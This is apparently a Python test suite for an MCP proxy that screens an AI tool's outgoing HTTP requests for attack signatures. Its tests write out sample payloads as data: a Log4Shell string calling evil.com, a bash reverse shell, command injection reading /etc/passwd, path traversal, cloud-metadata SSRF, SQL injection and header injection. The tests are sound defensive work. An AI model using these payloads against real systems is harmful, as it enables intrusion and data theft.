#!/usr/bin/env python3
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import subprocess
import sys
import unittest
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading


class MockHTTPHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    redirect_target_hits = 0

    def do_GET(self):
        if self.path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "/redirect-target")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        if self.path == "/redirect-target":
            type(self).redirect_target_hits += 1
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("X-Mock-Server", "Active")
        self.send_header("Content-Length", str(len(b'{"message": "legitimate_success"}')))
        self.end_headers()
        self.wfile.write(b'{"message": "legitimate_success"}')

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        _ = self.rfile.read(content_length)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b'{"status": "created"}')))
        self.end_headers()
        self.wfile.write(b'{"status": "created"}')

    def log_message(self, format, *args):
        pass


class TestAXMCPProxy(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.httpd = HTTPServer(("127.0.0.1", 0), MockHTTPHandler)
        cls.port = cls.httpd.server_address[1]
        cls.server_thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.server_thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def run_mcp_session(self, requests):
        input_data = "\n".join(json.dumps(r) for r in requests) + "\n"
        proc = subprocess.Popen(
            [sys.executable, "cmd/ax-mcp-proxy/ax_mcp_proxy.py"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        stdout, stderr = proc.communicate(input=input_data)
        responses = []
        for line in stdout.splitlines():
            line = line.strip()
            if line:
                responses.append(json.loads(line))
        return responses, stderr

    def test_initialize_and_tools_list(self):
        reqs = [
            {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2024-11-05"}},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}},
        ]
        resps, stderr = self.run_mcp_session(reqs)
        self.assertEqual(len(resps), 2)

        # Initialize
        init_res = resps[0].get("result", {})
        self.assertEqual(init_res.get("serverInfo", {}).get("name"), "ax-mcp-proxy")
        self.assertIn("tools", init_res.get("capabilities", {}))

        # Tools list
        tools_res = resps[1].get("result", {})
        tools = [t["name"] for t in tools_res.get("tools", [])]
        self.assertIn("http_request", tools)
        self.assertIn("check_security_payload", tools)
        self.assertIn("get_security_stats", tools)

    def test_blocked_exploit_log4shell(self):
        req = {
            "jsonrpc": "2.0",
            "id": 10,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "https://api.example.com/search",
                    "method": "POST",
                    "body": "search=${jndi:ldap://evil.com/x}",
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("SECURITY VIOLATION", content)
        self.assertIn("1000001", content)
        self.assertIn("Log4Shell", content)

    def test_blocked_command_injection(self):
        req = {
            "jsonrpc": "2.0",
            "id": 11,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "https://api.example.com/exec",
                    "method": "POST",
                    "body": "arg=hello; cat /etc/passwd",
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("1000006", content)

    def test_blocked_ssrf_metadata(self):
        req = {
            "jsonrpc": "2.0",
            "id": 12,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "http://169.254.169.254/latest/meta-data/",
                    "method": "GET",
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("1000030", content)

    def test_blocked_sql_injection(self):
        req = {
            "jsonrpc": "2.0",
            "id": 13,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "https://api.example.com/users?id=1%20UNION%20SELECT%20user,pass%20FROM%20admins",
                    "method": "GET",
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("1000040", content)

    def test_blocked_scanner_user_agent(self):
        req = {
            "jsonrpc": "2.0",
            "id": 14,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "https://api.example.com/status",
                    "headers": {"User-Agent": "sqlmap/1.7.2#stable"},
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("1000060", content)

    def test_blocked_path_traversal(self):
        req = {
            "jsonrpc": "2.0",
            "id": 15,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "https://api.example.com/files?path=../../../../etc/passwd",
                    "method": "GET",
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("1000020", content)

    def test_blocked_reverse_shell(self):
        req = {
            "jsonrpc": "2.0",
            "id": 16,
            "method": "tools/call",
            "params": {
                "name": "http_request",
                "arguments": {
                    "url": "https://api.example.com/shell",
                    "method": "POST",
                    "body": "payload=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                },
            },
        }
        resps, stderr = self.run_mcp_session([req])
        self.assertEqual(len(resps), 1)
        res = resps[0].get("result", {})
        self.assertTrue(res.get("isError"))
        content = res["content"][0]["text"]
        self.assertIn("1000003", content)

    def test_get_security_stats(self):
        reqs = [
            # 1 benign check
            {
                "jsonrpc": "2.0",
                "id": 30,
                "method": "tools/call",
                "params": {
                    "name": "check_security_payload",
                    "arguments": {"url": "https://api.example.com/safe"},
                },
            },
            # 1 blocked exploit request
            {
                "jsonrpc": "2.0",
                "id": 31,
                "method": "tools/call",
                "params": {
                    "name": "http_request",
                    "arguments": {
                        "url": "https://api.example.com/login",
                        "method": "POST",
                        "body": "user=admin' or '1'='1",
                    },
                },
            },
            # stats request
            {
                "jsonrpc": "2.0",
                "id": 32,
                "method": "tools/call",
                "params": {
                    "name": "get_security_stats",
                    "arguments": {},
                },
            },
        ]
        resps, stderr = self.run_mcp_session(reqs)
        self.assertEqual(len(resps), 3)
        stats = json.loads(resps[2]["result"]["content"][0]["text"])
        self.assertGreaterEqual(stats["total_inspected"], 1)
        self.assertGreaterEqual(stats["total_blocked"], 1)
        self.assertGreaterEqual(stats["rules_loaded"], 10)

    def make_server(self):
        sys.path.insert(0, "cmd/ax-mcp-proxy")
        from ax_mcp_proxy import SnortEngine, MCPServer
        engine = SnortEngine()
        engine.load_rules('drop tcp any any -> any any (content:"evil_string"; sid:999999; rev:1;)')
        import urllib.request
        from ax_mcp_proxy import NoRedirectHandler
        server = MCPServer(engine, opener=urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirectHandler()))
        captured = []
        server._send_response = lambda req_id, result: captured.append(result)
        return server, captured

    def test_live_proxy_forwarding(self):
        server, captured = self.make_server()
        server._execute_http_request(40, {"url": f"http://127.0.0.1:{self.port}/safe"})
        self.assertEqual(len(captured), 1)
        self.assertFalse(captured[0]["isError"])
        result = json.loads(captured[0]["content"][0]["text"])
        self.assertEqual(result["status_code"], 200)
        self.assertIn("legitimate_success", result["body"])
        self.assertEqual(result["headers"].get("X-Mock-Server"), "Active")

    def test_redirect_does_not_make_uninspected_request(self):
        server, captured = self.make_server()
        MockHTTPHandler.redirect_target_hits = 0
        server._execute_http_request(41, {"url": f"http://127.0.0.1:{self.port}/redirect"})
        self.assertFalse(captured[0]["isError"])
        result = json.loads(captured[0]["content"][0]["text"])
        self.assertEqual(result["status_code"], 302)
        self.assertEqual(MockHTTPHandler.redirect_target_hits, 0)

    def test_invalid_requests_never_reach_transport(self):
        from unittest.mock import patch
        cases = [
            {"url": "file:///etc/passwd"},
            {"url": "https://user:password@example.com/"},
            {"url": "https://example.com/", "headers": {"Content-Encoding": "gzip"}},
            {"url": "https://example.com/", "headers": {"X-Test": "ok\r\nInjected: yes"}},
            {"url": "https://example.com/", "body": "x" * (1024 * 1024 + 1)},
            {"url": "https://example.com/", "timeout_seconds": "nan"},
            {"url": "https://example.com/", "headers": []},
            {"url": "https://example.com/", "headers": {"Host": "169.254.169.254"}},
            {"url": "https://example.com/", "headers": {"Transfer-Encoding": "chunked"}},
            {"url": "https://example.com/", "timeout_seconds": 0.5},
            {"url": "https://example.com/", "timeout_seconds": True},
            {"url": "https://example.com/", "method": None},
        ]
        for args in cases:
            with self.subTest(args=list(args)):
                server, captured = self.make_server()
                with patch.object(server.opener, "open") as opened:
                    server._execute_http_request(42, args)
                    opened.assert_not_called()
                self.assertTrue(captured[0]["isError"])
                self.assertEqual(server.stats["total_blocked"], 1)

    def test_security_log_does_not_include_payload_or_url(self):
        server, captured = self.make_server()
        with self.assertLogs(level="WARNING") as logs:
            server._execute_http_request(43, {"url": "https://example.com/?token=super-secret", "method": "POST", "body": "evil_string super-secret"})
        self.assertNotIn("super-secret", "".join(logs.output))
        self.assertNotIn("example.com", "".join(logs.output))

    def test_alert_advisory_is_logged_without_payload(self):
        server, captured = self.make_server()
        server.engine.rules[0].action = "alert"
        with self.assertLogs(level="INFO") as logs:
            server._execute_http_request(45, {"url": f"http://127.0.0.1:{self.port}/safe?secret=super-secret", "method": "POST", "body": "evil_string super-secret"})
        self.assertFalse(captured[0]["isError"])
        self.assertIn("SID 999999 action alert", "".join(logs.output))
        self.assertNotIn("super-secret", "".join(logs.output))
        self.assertNotIn("127.0.0.1", "".join(logs.output))

    def test_inspection_timeout_blocks_dispatch_and_diagnostics(self):
        from unittest.mock import patch
        import ax_mcp_proxy
        server, captured = self.make_server()
        with patch.object(server.engine, "inspect", side_effect=ax_mcp_proxy.InspectionBudgetError("Request exceeded inspection time limit")), patch.object(server.opener, "open") as opened:
            server._execute_http_request(46, {"url": "https://example.com/"})
            server._execute_check_payload(47, {"url": "https://example.com/"})
            opened.assert_not_called()
        self.assertTrue(captured[0]["isError"])
        self.assertIn("inspection time limit", captured[0]["content"][0]["text"])
        diagnostic = json.loads(captured[1]["content"][0]["text"])
        self.assertTrue(diagnostic["blocked"])
        self.assertFalse(diagnostic["matched"])
        self.assertIn("inspection time limit", diagnostic["error"])

    def test_error_responses_have_bounded_reads(self):
        import io
        import urllib.error
        from unittest.mock import patch
        import ax_mcp_proxy
        server, captured = self.make_server()
        stream = io.BytesIO(b"x" * 100)
        response = urllib.error.HTTPError("https://example.com/", 500, "error", {}, stream)
        with patch.object(ax_mcp_proxy, "MAX_RESPONSE_BYTES", 32), patch.object(server.opener, "open", side_effect=response):
            server._execute_http_request(44, {"url": "https://example.com/"})
        self.assertTrue(captured[0]["isError"])
        self.assertIn("size limits", captured[0]["content"][0]["text"])

    def test_custom_only_requires_explicit_rules(self):
        proc = subprocess.run([sys.executable, "cmd/ax-mcp-proxy/ax_mcp_proxy.py", "--only-custom-rules"], input="", text=True, capture_output=True)
        self.assertNotEqual(proc.returncode, 0)
        self.assertIn("requires --rules", proc.stderr)

    def test_nonobject_tool_arguments_rejected(self):
        responses, _ = self.run_mcp_session([{"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "http_request", "arguments": []}}])
        self.assertEqual(responses[0]["error"]["code"], -32602)


if __name__ == "__main__":
    unittest.main()
